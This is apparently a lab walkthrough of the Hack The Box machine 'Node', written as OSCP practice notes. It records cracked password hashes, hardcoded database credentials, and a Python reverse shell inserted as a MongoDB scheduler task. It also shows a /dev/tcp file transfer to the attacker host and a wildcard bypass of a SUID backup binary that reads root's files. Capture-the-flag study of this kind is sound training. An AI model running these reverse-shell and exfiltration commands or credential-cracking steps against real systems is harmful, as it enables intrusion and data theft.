Machine: https://app.hackthebox.com/machines/110
IP: 10.10.10.58

Port: 3000

User
```
tom
mark
rastating
```

http://10.10.10.58:3000/api/users
```
	
0	
_id	"59a7365b98aa325cc03ee51c"
username	"myP14ceAdm1nAcc0uNT"
password	"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
is_admin	true
1	
_id	"59a7368398aa325cc03ee51d"
username	"tom"
password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
is_admin	false
2	
_id	"59a7368e98aa325cc03ee51e"
username	"mark"
password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
is_admin	false
3	
_id	"59aa9781cced6f1d1490fce9"
username	"rastating"
password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
is_admin	false
```

Password is SHA256

```
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
rastating:
```

Login as admin and download backup file

Decode it as base64 and output file type as PKZIP archive in cyberchef

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Detect_File_Type(true,true,true,true,true,true,true)

Crack PKZIP file using zip2john

```bash
zip2john pk.zip > john.txt
john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password

`magicword`

var/www/backup/myplace

```js
➜  myplace cat app.js 

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

Login through SSH with mark user

`mark:5AYRft73VtFpc84k`

`mark@node:/opt$ ls -la /usr/local/bin/backup 
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup`

Dump DB

`mongodump -u mark -p 5AYRft73VtFpc84k -d myplace`

```bash
mark@node:/tmp/dump/myplace$ cat users.bson 
 _idY 6[  2\ > username
myP14ceAdm1nAcc0uNT
password
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0ais_admin _idY 6   2\ > 

username
tom
password
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f24is_admin _idY 6   2\ > 

username
mark
password
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f7is_admin _idY     o   

username
rastating
password
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2fis_admin
```

```bash
mark@node:/tmp$ bsondump dump/myplace/users.bson 
{"_id":{"$oid":"59a7365b98aa325cc03ee51c"},"username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true}
{"_id":{"$oid":"59a7368398aa325cc03ee51d"},"username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false}
{"_id":{"$oid":"59a7368e98aa325cc03ee51e"},"username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false}
{"_id":{"$oid":"59aa9781cced6f1d1490fce9"},"username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
2024-02-19T06:44:24.666+0000    4 objects found
```

Tom running app.js in schedular database

`mark@node:/var/www/myplace$ ps aux | grep tom
tom       1248  0.0  5.2 1008568 39960 ?       Ssl  05:26   0:01 /usr/bin/node /var/scheduler/app.js`

Connect to scheduler DB

`mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler`

```bash
> show collections
tasks

# List content in tasks table - equivalent to 'select * from tasks'
> db.tasks.find()
The tasks collection does not contain any documents. Let’s add one that sends a reverse shell back to our attack machine.

# insert document that contains a reverse shell
db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
```

And we got shell as `tom`

user.txt 349a2caaf7c9cf04499d4e4a6e697600

User tom is in sudo and admin group but privilege escalation exploit doesn't work

`uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)`

Earlier we had this

`mark@node:/opt$ ls -la /usr/local/bin/backup 
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup`

In app.js, this SUID binary is being called with -q and backup_key, also require directory to output to

```js
app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```

backup_key can be found at the top of app.js

`const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
`

`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp`

We got a bunch of base64

Output to a file

`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > output3`

Get the file to our machine for easier analysis

Victim:

`cat output3 > /dev/tcp/10.10.16.12/1111`

Attacker:

`nc -lnvp 1111 > output3`

Decode

`base64 -d output3 > output3.decode`

PKZIP file by looking at header

Unzip the file using `magicword` as password 

We got like symlink to `/tmp` on the target machine because we specify `/tmp` when using `/usr/local/bin/backup`

Let's specify root instead

`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > output3_root`

Decode with base64 and add .zip extension as above

Unzip it with 7z

`7z x output3_root.zip`

We got trolled

```
➜  loot cat root.txt 
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

https://sanaullahamankorai.medium.com/hackthebox-node-walkthrough-f774ae2ece5c

Analyze the /usr/local/bin/backup

```bash
strstr("/tmp", "..")                             = nil
strstr("/tmp", "/root")                          = nil
strchr("/tmp", ';')                              = nil
strchr("/tmp", '&')                              = nil
strchr("/tmp", '`')                              = nil
strchr("/tmp", '$')                              = nil
strchr("/tmp", '|')                              = nil
strstr("/tmp", "//")                             = nil
strcmp("/tmp", "/")                              = 1
strstr("/tmp", "/etc")                           = nil
strcpy(0xffe73a5b, "/tmp")                       = 0xffe73a5b
```

strstr: returns pointer to first occurrence of str2 in str1

strchr: returns pointer to first occurrence of char in str1

strcmp: returns 0 if str1 is same as str2

As can be seen, the program is filtering the directory path string. If we include any of the strings enclosed in the strchr or strstr function as a directory path, we end up with a troll face. Similarly, if the directory path is a single “/”, we also get a troll face. So we’re allowed to use a backslash as long as it’s included as a string with other characters.

Since `*` isn't filter, we can use wildcard to link /root by using `/r**t`

`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > output4_root`

Repeat the same steps as above

Need to use wildcard on `r**t.txt` as well since it contains the word **root**

root.txt ffafdabd4dda69693752bca85a6e6660




![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/a8b1aa79-82dc-4d76-adec-246f2b23b6e4)
